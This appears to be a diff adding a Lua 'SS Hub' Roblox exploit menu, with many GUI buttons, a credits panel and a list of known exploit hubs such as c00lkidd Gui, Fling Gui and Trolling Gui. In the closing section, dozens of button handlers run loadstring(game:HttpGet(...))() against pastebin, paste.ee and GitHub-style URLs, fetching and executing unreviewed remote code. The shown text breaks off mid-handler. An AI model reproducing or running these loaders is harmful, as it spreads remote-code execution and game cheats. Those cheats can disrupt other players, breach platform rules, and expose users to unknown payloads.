+ScreenGui.TakeTheL.Parent = ScreenGui.ScrollingFrame
+ScreenGui.TakeTheL.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.TakeTheL.Position = UDim2.new(0.0429042876, 0, 0.878409088, 0)
+ScreenGui.TakeTheL.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.TakeTheL.Font = Enum.Font.SourceSans
+ScreenGui.TakeTheL.Text = "TakeTheL"
+ScreenGui.TakeTheL.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.TakeTheL.TextSize = 25.000
+
+ScreenGui.UICorner_75.Parent = ScreenGui.TakeTheL
+
+ScreenGui.BlackHole.Name = "BlackHole"
+ScreenGui.BlackHole.Parent = ScreenGui.ScrollingFrame
+ScreenGui.BlackHole.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.BlackHole.Position = UDim2.new(0.521452129, 0, 0.878851175, 0)
+ScreenGui.BlackHole.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.BlackHole.Font = Enum.Font.SourceSans
+ScreenGui.BlackHole.Text = "BlackHole"
+ScreenGui.BlackHole.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.BlackHole.TextSize = 25.000
+
+ScreenGui.UICorner_76.Parent = ScreenGui.BlackHole
+
+ScreenGui.JhonDoe.Name = "JhonDoe"
+ScreenGui.JhonDoe.Parent = ScreenGui.ScrollingFrame
+ScreenGui.JhonDoe.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.JhonDoe.Position = UDim2.new(0.0429042876, 0, 0.903608024, 0)
+ScreenGui.JhonDoe.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.JhonDoe.Font = Enum.Font.SourceSans
+ScreenGui.JhonDoe.Text = "JhonDoe"
+ScreenGui.JhonDoe.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.JhonDoe.TextSize = 25.000
+
+ScreenGui.UICorner_77.Parent = ScreenGui.JhonDoe
+
+ScreenGui.Neko.Name = "Neko"
+ScreenGui.Neko.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Neko.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Neko.Position = UDim2.new(0.521452129, 0, 0.903165936, 0)
+ScreenGui.Neko.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Neko.Font = Enum.Font.SourceSans
+ScreenGui.Neko.Text = "Neko"
+ScreenGui.Neko.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Neko.TextSize = 25.000
+
+ScreenGui.UICorner_78.Parent = ScreenGui.Neko
+
+ScreenGui.Boobs.Name = "Boobs"
+ScreenGui.Boobs.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Boobs.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Boobs.Position = UDim2.new(0.0429042876, 0, 0.928364873, 0)
+ScreenGui.Boobs.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Boobs.Font = Enum.Font.SourceSans
+ScreenGui.Boobs.Text = "Boobs"
+ScreenGui.Boobs.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Boobs.TextSize = 25.000
+
+ScreenGui.UICorner_79.Parent = ScreenGui.Boobs
+
+ScreenGui.Rtx.Name = "Rtx"
+ScreenGui.Rtx.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Rtx.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Rtx.Position = UDim2.new(0.521452129, 0, 0.928364873, 0)
+ScreenGui.Rtx.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Rtx.Font = Enum.Font.SourceSans
+ScreenGui.Rtx.Text = "Rtx"
+ScreenGui.Rtx.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Rtx.TextSize = 25.000
+
+ScreenGui.UICorner_80.Parent = ScreenGui.Rtx
+
+ScreenGui.VR.Name = "VR"
+ScreenGui.VR.Parent = ScreenGui.ScrollingFrame
+ScreenGui.VR.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.VR.Position = UDim2.new(0.0429042876, 0, 0.954005957, 0)
+ScreenGui.VR.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.VR.Font = Enum.Font.SourceSans
+ScreenGui.VR.Text = "VR"
+ScreenGui.VR.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.VR.TextSize = 25.000
+
+ScreenGui.UICorner_81.Parent = ScreenGui.VR
+
+ScreenGui.Gun.Name = "Gun"
+ScreenGui.Gun.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Gun.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Gun.Position = UDim2.new(0.521452129, 0, 0.954005957, 0)
+ScreenGui.Gun.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Gun.Font = Enum.Font.SourceSans
+ScreenGui.Gun.Text = "Gun"
+ScreenGui.Gun.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Gun.TextSize = 25.000
+
+ScreenGui.UICorner_82.Parent = ScreenGui.Gun
+
+ScreenGui.Titain.Name = "Titain"
+ScreenGui.Titain.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Titain.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Titain.Position = UDim2.new(0.0429042876, 0, 0.97787863, 0)
+ScreenGui.Titain.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Titain.Font = Enum.Font.SourceSans
+ScreenGui.Titain.Text = "Titain"
+ScreenGui.Titain.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Titain.TextSize = 25.000
+
+ScreenGui.UICorner_83.Parent = ScreenGui.Titain
+
+ScreenGui.PixelCar.Name = "PixelCar"
+ScreenGui.PixelCar.Parent = ScreenGui.ScrollingFrame
+ScreenGui.PixelCar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.PixelCar.Position = UDim2.new(0.521452129, 0, 0.97787863, 0)
+ScreenGui.PixelCar.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.PixelCar.Font = Enum.Font.SourceSans
+ScreenGui.PixelCar.Text = "PixelCar"
+ScreenGui.PixelCar.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.PixelCar.TextSize = 25.000
+
+ScreenGui.UICorner_84.Parent = ScreenGui.PixelCar
+
+ScreenGui.hubsframe.Name = "hubsframe"
+ScreenGui.hubsframe.Parent = ScreenGui.Frame
+ScreenGui.hubsframe.Active = true
+ScreenGui.hubsframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.hubsframe.Position = UDim2.new(0.357293874, 0, 0, 0)
+ScreenGui.hubsframe.Size = UDim2.new(0, 303, 0, 376)
+ScreenGui.hubsframe.Visible = false
+
+ScreenGui.UICorner_85.Parent = ScreenGui.hubsframe
+
+ScreenGui.TextLabel_6.Parent = ScreenGui.hubsframe
+ScreenGui.TextLabel_6.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_6.Position = UDim2.new(1.00718083e-07, 0, 0, 0)
+ScreenGui.TextLabel_6.Size = UDim2.new(0, 303, 0, 42)
+ScreenGui.TextLabel_6.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_6.Text = "HUBS"
+ScreenGui.TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_6.TextSize = 40.000
+
+ScreenGui.UICorner_86.Parent = ScreenGui.TextLabel_6
+
+ScreenGui.c00lkiddguiv2.Name = "c00lkiddguiv2"
+ScreenGui.c00lkiddguiv2.Parent = ScreenGui.hubsframe
+ScreenGui.c00lkiddguiv2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.c00lkiddguiv2.Position = UDim2.new(0.0396039598, 0, 0.154255316, 0)
+ScreenGui.c00lkiddguiv2.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.c00lkiddguiv2.Font = Enum.Font.SourceSans
+ScreenGui.c00lkiddguiv2.Text = "c00lkidd Gui V2"
+ScreenGui.c00lkiddguiv2.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.c00lkiddguiv2.TextSize = 25.000
+
+ScreenGui.UICorner_87.Parent = ScreenGui.c00lkiddguiv2
+
+ScreenGui.c00lkiddguiv1.Name = "c00lkiddguiv1"
+ScreenGui.c00lkiddguiv1.Parent = ScreenGui.hubsframe
+ScreenGui.c00lkiddguiv1.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.c00lkiddguiv1.Position = UDim2.new(0.524752498, 0, 0.154255316, 0)
+ScreenGui.c00lkiddguiv1.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.c00lkiddguiv1.Font = Enum.Font.SourceSans
+ScreenGui.c00lkiddguiv1.Text = "c00lkidd Gui V1"
+ScreenGui.c00lkiddguiv1.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.c00lkiddguiv1.TextSize = 25.000
+
+ScreenGui.UICorner_88.Parent = ScreenGui.c00lkiddguiv1
+
+ScreenGui.LostPoint.Name = "LostPoint"
+ScreenGui.LostPoint.Parent = ScreenGui.hubsframe
+ScreenGui.LostPoint.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.LostPoint.Position = UDim2.new(0.0396039784, 0, 0.300531924, 0)
+ScreenGui.LostPoint.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.LostPoint.Font = Enum.Font.SourceSans
+ScreenGui.LostPoint.Text = "LostPoint"
+ScreenGui.LostPoint.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.LostPoint.TextSize = 25.000
+
+ScreenGui.UICorner_89.Parent = ScreenGui.LostPoint
+
+ScreenGui.SniffHub.Name = "SniffHub"
+ScreenGui.SniffHub.Parent = ScreenGui.hubsframe
+ScreenGui.SniffHub.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.SniffHub.Position = UDim2.new(0.524752498, 0, 0.300531924, 0)
+ScreenGui.SniffHub.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.SniffHub.Font = Enum.Font.SourceSans
+ScreenGui.SniffHub.Text = "Sniff Hub"
+ScreenGui.SniffHub.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.SniffHub.TextSize = 25.000
+
+ScreenGui.UICorner_90.Parent = ScreenGui.SniffHub
+
+ScreenGui.MrDestroyerHub.Name = "MrDestroyerHub"
+ScreenGui.MrDestroyerHub.Parent = ScreenGui.hubsframe
+ScreenGui.MrDestroyerHub.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.MrDestroyerHub.Position = UDim2.new(0.0396039784, 0, 0.454787254, 0)
+ScreenGui.MrDestroyerHub.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.MrDestroyerHub.Font = Enum.Font.SourceSans
+ScreenGui.MrDestroyerHub.Text = "MrDestroyer Hub"
+ScreenGui.MrDestroyerHub.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.MrDestroyerHub.TextSize = 20.000
+
+ScreenGui.UICorner_91.Parent = ScreenGui.MrDestroyerHub
+
+ScreenGui.MrDestroyerHubv2.Name = "MrDestroyerHubv2"
+ScreenGui.MrDestroyerHubv2.Parent = ScreenGui.hubsframe
+ScreenGui.MrDestroyerHubv2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.MrDestroyerHubv2.Position = UDim2.new(0.524752498, 0, 0.454787254, 0)
+ScreenGui.MrDestroyerHubv2.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.MrDestroyerHubv2.Font = Enum.Font.SourceSans
+ScreenGui.MrDestroyerHubv2.Text = "MrDestroyer Hub V2"
+ScreenGui.MrDestroyerHubv2.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.MrDestroyerHubv2.TextSize = 20.000
+
+ScreenGui.UICorner_92.Parent = ScreenGui.MrDestroyerHubv2
+
+ScreenGui.FlingGui.Name = "FlingGui"
+ScreenGui.FlingGui.Parent = ScreenGui.hubsframe
+ScreenGui.FlingGui.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.FlingGui.Position = UDim2.new(0.0396039784, 0, 0.609042585, 0)
+ScreenGui.FlingGui.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.FlingGui.Font = Enum.Font.SourceSans
+ScreenGui.FlingGui.Text = "Fling Gui"
+ScreenGui.FlingGui.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.FlingGui.TextSize = 20.000
+
+ScreenGui.UICorner_93.Parent = ScreenGui.FlingGui
+
+ScreenGui.TrollingGui.Name = "TrollingGui"
+ScreenGui.TrollingGui.Parent = ScreenGui.hubsframe
+ScreenGui.TrollingGui.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.TrollingGui.Position = UDim2.new(0.524752498, 0, 0.609042585, 0)
+ScreenGui.TrollingGui.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.TrollingGui.Font = Enum.Font.SourceSans
+ScreenGui.TrollingGui.Text = "Trolling Gui"
+ScreenGui.TrollingGui.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.TrollingGui.TextSize = 20.000
+
+ScreenGui.UICorner_94.Parent = ScreenGui.TrollingGui
+
+ScreenGui.VHub.Name = "VHub"
+ScreenGui.VHub.Parent = ScreenGui.hubsframe
+ScreenGui.VHub.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.VHub.Position = UDim2.new(0.0396039784, 0, 0.752659619, 0)
+ScreenGui.VHub.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.VHub.Font = Enum.Font.SourceSans
+ScreenGui.VHub.Text = "VHub"
+ScreenGui.VHub.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.VHub.TextSize = 20.000
+
+ScreenGui.UICorner_95.Parent = ScreenGui.VHub
+
+ScreenGui.T0PKEKV40.Name = "T0PKEKV4.0"
+ScreenGui.T0PKEKV40.Parent = ScreenGui.hubsframe
+ScreenGui.T0PKEKV40.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.T0PKEKV40.Position = UDim2.new(0.524752498, 0, 0.752659619, 0)
+ScreenGui.T0PKEKV40.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.T0PKEKV40.Font = Enum.Font.SourceSans
+ScreenGui.T0PKEKV40.Text = "T0PKEK V4.0"
+ScreenGui.T0PKEKV40.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.T0PKEKV40.TextSize = 20.000
+
+ScreenGui.UICorner_96.Parent = ScreenGui.T0PKEKV40
+
+ScreenGui.MOONUV10.Name = "MOONUİV10"
+ScreenGui.MOONUV10.Parent = ScreenGui.hubsframe
+ScreenGui.MOONUV10.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.MOONUV10.Position = UDim2.new(0.0396039784, 0, 0.882978797, 0)
+ScreenGui.MOONUV10.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.MOONUV10.Font = Enum.Font.SourceSans
+ScreenGui.MOONUV10.Text = "MoonUi V10"
+ScreenGui.MOONUV10.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.MOONUV10.TextSize = 20.000
+
+ScreenGui.UICorner_97.Parent = ScreenGui.MOONUV10
+
+ScreenGui.KZSHuB.Name = "KZSHuB"
+ScreenGui.KZSHuB.Parent = ScreenGui.hubsframe
+ScreenGui.KZSHuB.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.KZSHuB.Position = UDim2.new(0.524752498, 0, 0.882978797, 0)
+ScreenGui.KZSHuB.Size = UDim2.new(0, 138, 0, 34)
+ScreenGui.KZSHuB.Font = Enum.Font.SourceSans
+ScreenGui.KZSHuB.Text = "KZSHuB"
+ScreenGui.KZSHuB.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.KZSHuB.TextSize = 20.000
+
+ScreenGui.UICorner_98.Parent = ScreenGui.KZSHuB
+
+ScreenGui.creditsframe.Name = "creditsframe"
+ScreenGui.creditsframe.Parent = ScreenGui.Frame
+ScreenGui.creditsframe.Active = true
+ScreenGui.creditsframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.creditsframe.Position = UDim2.new(0.357293874, 0, 0, 0)
+ScreenGui.creditsframe.Size = UDim2.new(0, 303, 0, 376)
+ScreenGui.creditsframe.Visible = false
+
+ScreenGui.UICorner_99.Parent = ScreenGui.creditsframe
+
+ScreenGui.TextLabel_7.Parent = ScreenGui.creditsframe
+ScreenGui.TextLabel_7.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_7.Position = UDim2.new(0.168316826, 0, 0, 0)
+ScreenGui.TextLabel_7.Size = UDim2.new(0, 200, 0, 42)
+ScreenGui.TextLabel_7.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_7.Text = "CREDİTS"
+ScreenGui.TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_7.TextSize = 40.000
+
+ScreenGui.UICorner_100.Parent = ScreenGui.TextLabel_7
+
+ScreenGui.TextLabel_8.Parent = ScreenGui.creditsframe
+ScreenGui.TextLabel_8.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_8.Position = UDim2.new(1.00718083e-07, 0, 0.180851057, 0)
+ScreenGui.TextLabel_8.Size = UDim2.new(0, 302, 0, 50)
+ScreenGui.TextLabel_8.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_8.Text = "Hub By Sedatrek"
+ScreenGui.TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_8.TextSize = 30.000
+
+ScreenGui.UICorner_101.Parent = ScreenGui.TextLabel_8
+
+ScreenGui.TextLabel_9.Parent = ScreenGui.creditsframe
+ScreenGui.TextLabel_9.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_9.Position = UDim2.new(0.00660076085, 0, 0.433510661, 0)
+ScreenGui.TextLabel_9.Size = UDim2.new(0, 302, 0, 50)
+ScreenGui.TextLabel_9.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_9.Text = "sedat#3034"
+ScreenGui.TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_9.TextSize = 30.000
+
+ScreenGui.UICorner_102.Parent = ScreenGui.TextLabel_9
+
+ScreenGui.TextLabel_10.Parent = ScreenGui.creditsframe
+ScreenGui.TextLabel_10.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_10.Position = UDim2.new(0.00660076085, 0, 0.765957475, 0)
+ScreenGui.TextLabel_10.Size = UDim2.new(0, 302, 0, 50)
+ScreenGui.TextLabel_10.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_10.Text = "https://discord.gg/MDZWrmRW"
+ScreenGui.TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_10.TextSize = 25.000
+
+ScreenGui.UICorner_103.Parent = ScreenGui.TextLabel_10
+
+ScreenGui.TextLabel_11.Parent = ScreenGui.Frame
+ScreenGui.TextLabel_11.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_11.Position = UDim2.new(0.43340382, 0, 0.257294416, 0)
+ScreenGui.TextLabel_11.Size = UDim2.new(0, 227, 0, 50)
+ScreenGui.TextLabel_11.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_11.Text = "Thank For Using SS Hub "
+ScreenGui.TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_11.TextSize = 30.000
+
+ScreenGui.UICorner_104.Parent = ScreenGui.TextLabel_11
+
+ScreenGui.TextLabel_12.Parent = ScreenGui.Frame
+ScreenGui.TextLabel_12.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_12.Position = UDim2.new(0.43340382, 0, 0.12466839, 0)
+ScreenGui.TextLabel_12.Size = UDim2.new(0, 227, 0, 50)
+ScreenGui.TextLabel_12.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_12.Text = "👑"
+ScreenGui.TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_12.TextSize = 30.000
+
+ScreenGui.UICorner_105.Parent = ScreenGui.TextLabel_12
+
+ScreenGui.HubuKapat.Name = "HubuKapat"
+ScreenGui.HubuKapat.Parent = ScreenGui.Frame
+ScreenGui.HubuKapat.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.HubuKapat.Position = UDim2.new(0.900634229, 0, -0.0424403176, 0)
+ScreenGui.HubuKapat.Size = UDim2.new(0, 75, 0, 50)
+ScreenGui.HubuKapat.Font = Enum.Font.Kalam
+ScreenGui.HubuKapat.Text = "X"
+ScreenGui.HubuKapat.TextColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.HubuKapat.TextSize = 40.000
+
+ScreenGui.UICorner_106.Parent = ScreenGui.HubuKapat
+
+-- scripts
+
+ScreenGui.Scripts.MouseButton1Down:connect(function()
+	ScreenGui.scriptsframe.Visible = true
+	ScreenGui.fescriptsframe.Visible = false
+	ScreenGui.hubsframe.Visible = false
+	ScreenGui.creditsframe.Visible = false
+	ScreenGui.TextLabel_11.Visible = false
+	ScreenGui.TextLabel_12.Visible = false
+end)
+
+ScreenGui.FeScripts.MouseButton1Down:connect(function()
+	ScreenGui.scriptsframe.Visible = false
+	ScreenGui.fescriptsframe.Visible = true
+	ScreenGui.hubsframe.Visible = false
+	ScreenGui.creditsframe.Visible = false
+	ScreenGui.TextLabel_11.Visible = false
+	ScreenGui.TextLabel_12.Visible = false
+end)
+
+ScreenGui.Hubs.MouseButton1Down:connect(function()
+	ScreenGui.scriptsframe.Visible = false
+	ScreenGui.fescriptsframe.Visible = false
+	ScreenGui.hubsframe.Visible = true
+	ScreenGui.creditsframe.Visible = false
+	ScreenGui.TextLabel_11.Visible = false
+	ScreenGui.TextLabel_12.Visible = false
+end)
+
+ScreenGui.Credits.MouseButton1Down:connect(function()
+	ScreenGui.scriptsframe.Visible = false
+	ScreenGui.fescriptsframe.Visible = false
+	ScreenGui.hubsframe.Visible = false
+	ScreenGui.creditsframe.Visible = true
+	ScreenGui.TextLabel_11.Visible = false
+	ScreenGui.TextLabel_12.Visible = false
+end)
+
+ScreenGui.HubuKapat.MouseButton1Down:connect(function()
+	ScreenGui.ScreenGui:Destroy()
+end)
+
+ScreenGui.Sonic.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/SyF5t70A"))()
+end)
+
+ScreenGui.Gale.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/PjJNLaFa", true))()
+end)
+
+ScreenGui.AmongUs.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/JXUMavf3", true))()
+end)
+
+ScreenGui.KillBot.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/G24tcRXA"))()
+end)
+
+ScreenGui.NekoMaid.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://paste.ee/d/iCtCM/0"))()
+end)
+
+ScreenGui.SmugDance.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ZuKy7HFF"))()
+end)
+
+ScreenGui.ShadowBlade.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/kMYThpNG"))()
+end)
+
+ScreenGui.FishingRod.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Wp8C1bi7"))()
+end)
+
+ScreenGui.SwordStand.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://paste.ee/r/NwGVX/0"))()
+end)
+
+ScreenGui.NeptunionV.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/t0Mkc33N"))()
+end)
+
+ScreenGui.RbNeptunion.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/gDi503fB"))()
+end)
+
+ScreenGui.Wall.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/AY6kA2AV"))()
+end)
+
+ScreenGui.AchromaticGlitcher.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/T7cmny7C"))()
+end)
+
+ScreenGui.FlamingCube.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/D7pigANg"))()
+end)
+
+ScreenGui.Spider.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/txsk1LJg"))()
+end)
+
+ScreenGui.Cop.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/VAA5Mf60"))()
+end)
+
+ScreenGui.Chips.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/b289ts36"))()
+end)
+
+ScreenGui.Joy.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/LEAQuKj0"))()
+end)
+
+ScreenGui.UltimateMemeDance.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/0QfjMKrF"))()
+end)
+
+ScreenGui.Chill.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/0QfjMKrF"))()
+end)
+
+ScreenGui.WallWalk.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RY9cBbdG"))()
+end)
+
+ScreenGui.Grapple.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/AyASkDEG"))()
+end)
+
+ScreenGui.KrystalDance.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/FV3HLmTH"))()
+end)
+
+ScreenGui.Stand.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RZUwatYV"))()
+end)
+
+ScreenGui.ServerAdmin.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://rawgithubusercontent.com/ONEReverseCard/My-Scripts/main/Netless%20Server%20Adminmd"))()
+end)
+
+ScreenGui.BanHammer.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://rawgithubusercontent.com/killermaster9999mega/thing/main/READMEmd"))()
+end)
+
+ScreenGui.ParkourGod.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xwmnPkvY"))()
+end)
+
+ScreenGui.Sniper.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/dtz7qGBg"))()
+end)
+
+ScreenGui.Ender.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/bndCgupK"))()
+end)
+
+ScreenGui.VrSword.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/M9pnqjtn"))()
+end)
+
+ScreenGui.Caducus.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/jfryBKds"))()
+end)
+
+ScreenGui.ElioBlasio.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xvBXu6Yc"))()
+end)
+
+ScreenGui.Minigun.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/sK9EUPE6"))()
+end)
+
+ScreenGui.Car.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://rawgithubusercontent.com/MonkoTubeYT/carscript/master/!carscriptlua',true))()
+end)
+
+ScreenGui.Carnage.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/Ntg4PB33',true))()
+end)
+
+ScreenGui.SegsDoll.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/dB6DGBB6',true))()
+end)
+
+ScreenGui.Memeus.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/cCMJ9C82"))()
+end)
+
+ScreenGui.Pen.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/1qcpeuDm"))()
+end)
+
+ScreenGui.Xester.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RPwyPvEi"))()
+end)
+
+ScreenGui.Broomstick.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xyHiNwtg"))()
+end)
+
+ScreenGui.Headless.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/mssZBy9j"))()
+end)
+
+ScreenGui.HeadHold.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/jsZHrVFf"))()
+end)
+
+ScreenGui.Goopie.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/fKLm580i"))()
+end)
+
+ScreenGui.OrangeJustice.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Efg0DgkP"))()
+end)
+
+ScreenGui.Floss.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/JfyvWHLf"))()
+end)
+
+ScreenGui.DistractDance.MouseButton1Click:Connect(function()
